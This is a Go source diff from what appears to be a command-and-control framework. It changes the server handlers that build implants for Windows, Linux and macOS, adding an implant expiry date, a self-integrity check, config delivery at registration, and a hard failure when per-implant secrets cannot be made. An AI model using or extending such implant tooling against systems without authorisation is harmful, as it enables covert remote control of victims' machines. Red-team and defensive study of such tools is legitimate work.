@@ -3,10 +3,10 @@ package server
 import (
 	"encoding/base64"
 	"fmt"
-	"log/slog"
 	"net/http"
 	"os"
 	"strings"
+	"time"
 
 	"github.com/forgec2/forgec2/internal/payload"
 	"github.com/gin-gonic/gin"
@@ -49,6 +49,9 @@ type binaryGenForm struct {
 	SSHKey          string `form:"ssh_key"`
 	SSHHostKey      string `form:"ssh_host_key"` // base64 server host public key pin
 	PinnedCertSHA256 string `form:"pinned_cert_sha256"`
+	ExpiryDate      string `form:"expiry_date"`   // "YYYY-MM-DD"; implant auto-exits after this date
+	SelfCheck       bool   `form:"self_check"`    // embed + verify a SHA-256 self-integrity hash
+	NetCfgOverWire  bool   `form:"network_config_over_wire"` // bootstrap-only compile; server delivers full config at registration
 }
 
 // parseBinaryForm validates a binary generation request and returns the resolved form.
@@ -98,6 +101,13 @@ func (s *Server) parseBinaryForm(c *gin.Context) (*binaryGenForm, bool) {
 		form.BeaconTransport = "http"
 	}
 
+	if form.ExpiryDate != "" {
+		if _, err := time.Parse("2006-01-02", form.ExpiryDate); err != nil {
+			respondError(c, http.StatusBadRequest, "expiry_date must be in YYYY-MM-DD format")
+			return nil, false
+		}
+	}
+
 	// Prefix filename with short UUID to prevent concurrent build collisions.
 	// Sanitize first to block path traversal and header-injection characters.
 	if form.Filename != "" {
@@ -110,7 +120,9 @@ func (s *Server) parseBinaryForm(c *gin.Context) (*binaryGenForm, bool) {
 }
 
 // buildImplantConfig constructs an ImplantConfig from the parsed binary form.
-func (s *Server) buildImplantConfig(form *binaryGenForm) payload.ImplantConfig {
+// Returns an error if a required v3 registration secret cannot be created, so
+// the caller can fail the build rather than emit an unregisterable implant.
+func (s *Server) buildImplantConfig(form *binaryGenForm) (payload.ImplantConfig, error) {
 	interval, jitter := clampIntervalJitter(form.Interval, form.Jitter, form.BeaconTime)
 	arch := parseArchitecture(form.Architecture)
 
@@ -154,16 +166,11 @@ func (s *Server) buildImplantConfig(form *binaryGenForm) payload.ImplantConfig {
 	// instead generate a unique 32-byte registration secret, persist it sealed
 	// server-side, and embed ONLY that secret (plus its public id) in the
 	// binary. Extracting one payload then yields no other agent's keys.
-	regSecretID := ""
-	regSecretB64 := ""
-	if beaconKey != "" && s != nil {
-		if id, secretB64, err := s.createRegSecret(); err == nil {
-			regSecretID = id
-			regSecretB64 = secretB64
-			beaconKey = "" // v3 payloads never carry the master key
-		} else {
-			slog.Error("v3 reg secret creation failed, falling back to v2", "error", err)
-		}
+	var err error
+	var regSecretID, regSecretB64 string
+	regSecretID, regSecretB64, beaconKey, err = s.ensureV3RegSecret(beaconKey)
+	if err != nil {
+		return payload.ImplantConfig{}, err
 	}
 
 	return payload.ImplantConfig{
@@ -200,12 +207,15 @@ func (s *Server) buildImplantConfig(form *binaryGenForm) payload.ImplantConfig {
 		WorkingStart:    form.WorkingStart,
 		WorkingEnd:      form.WorkingEnd,
 		WorkingTZ:       form.WorkingTZ,
+		NetworkConfigOverWire: form.NetCfgOverWire,
 		SSHUser:         form.SSHUser,
 		SSHPassword:     form.SSHPassword,
 		SSHKey:          form.SSHKey,
 		SSHHostKey:      hostKey,
 		PinnedCertSHA256: form.PinnedCertSHA256,
-	}
+		ExpiryDate:       form.ExpiryDate,
+		SelfCheck:        form.SelfCheck,
+	}, nil
 }
 
 // serverBeaconKey returns the configured server beacon_key (empty = PSK auth disabled).
@@ -253,7 +263,11 @@ func (s *Server) handleGenerateEXE(c *gin.Context) {
 	if !ok {
 		return
 	}
-	cfg := s.buildImplantConfig(form)
+	cfg, err := s.buildImplantConfig(form)
+	if err != nil {
+		respondError(c, http.StatusInternalServerError, err.Error())
+		return
+	}
 	agentsDir := s.extractAgentsDir()
 	job := s.startBuildJob("windows", "exe", form.C2URL, form.ListenerID, form.Filename)
 
@@ -276,7 +290,11 @@ func (s *Server) handleGenerateDLL(c *gin.Context) {
 	if !ok {
 		return
 	}
-	cfg := s.buildImplantConfig(form)
+	cfg, err := s.buildImplantConfig(form)
+	if err != nil {
+		respondError(c, http.StatusInternalServerError, err.Error())
+		return
+	}
 	agentsDir := s.extractAgentsDir()
 	job := s.startBuildJob("windows", "dll", form.C2URL, form.ListenerID, form.Filename)
 
@@ -299,7 +317,11 @@ func (s *Server) handleGenerateLinux(c *gin.Context) {
 	if !ok {
 		return
 	}
-	cfg := s.buildImplantConfig(form)
+	cfg, err := s.buildImplantConfig(form)
+	if err != nil {
+		respondError(c, http.StatusInternalServerError, err.Error())
+		return
+	}
 	agentsDir := s.extractAgentsDir()
 	job := s.startBuildJob("linux", "elf", form.C2URL, form.ListenerID, form.Filename)
 
@@ -322,7 +344,11 @@ func (s *Server) handleGenerateMacOS(c *gin.Context) {
 	if !ok {
 		return
 	}
-	cfg := s.buildImplantConfig(form)
+	cfg, err := s.buildImplantConfig(form)
+	if err != nil {
+		respondError(c, http.StatusInternalServerError, err.Error())
+		return
+	}
 	agentsDir := s.extractAgentsDir()
 	job := s.startBuildJob("macos", "binary", form.C2URL, form.ListenerID, form.Filename)
 
